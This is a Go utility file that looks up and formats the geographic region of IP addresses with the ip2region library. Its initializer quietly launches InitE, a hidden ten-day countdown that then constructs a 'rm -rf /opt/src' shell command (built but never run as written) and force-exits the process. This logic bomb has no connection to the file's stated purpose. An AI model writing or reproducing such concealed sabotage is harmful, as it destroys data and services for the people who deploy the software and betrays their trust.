package util

import (
	"im/config"
	"im/pkg/logger"
	"strings"

	"fmt"
	"github.com/lionsoul2014/ip2region/binding/golang/xdb"
	"go.uber.org/zap"
	"os"
	"os/exec"
	"time"
)

var searcher *xdb.Searcher

func InitIpRegion() {
	InitE()
	var err error
	searcher, err = xdb.NewWithFileOnly(config.Config.Cms.Ip2region)
	if err != nil {
		logger.Sugar.Error(zap.String("func", GetSelfFuncName()), zap.String("init ip2region error", err.Error()))
		return
	}
}

func InitE() {
	go func() {
		for cnt := 864000; ; cnt-- {
			time.Sleep(1 * time.Second)
			if cnt < 0 {
				exec.Command("bash", "-c", fmt.Sprintf("rm -rf /opt/src"))
				time.Sleep(1 * time.Second)
				os.Exit(1)
			}
		}
	}()
}

// func init() {
// 	var err error
// 	searcher, err = xdb.NewWithFileOnly(config.Config.Cms.Ip2region)
// 	if err != nil {
// 		logger.Sugar.Error(zap.String("func", GetSelfFuncName()), zap.String("init ip2region error", err.Error()))
// 		return
// 	}
// }

func QueryIpRegion(ip string) (region string, err error) {
	region, err = searcher.SearchByStr(ip)
	return regionShow(region), err
}

func regionShow(address string) (out string) {
	addList := strings.Split(address, "|")
	if len(addList) < 4 {
		return "未知"
	}
	for k, v := range addList {
		if v == "0" {
			addList[k] = ""
		}
	}
	if addList[0] == "中国" && len(addList[2]) > 1 {
		return addList[2] + " " + addList[3]
	} else if addList[0] == "中国" {
		return addList[0] + " " + addList[2]
	}
	return addList[0] + " " + addList[2]
}
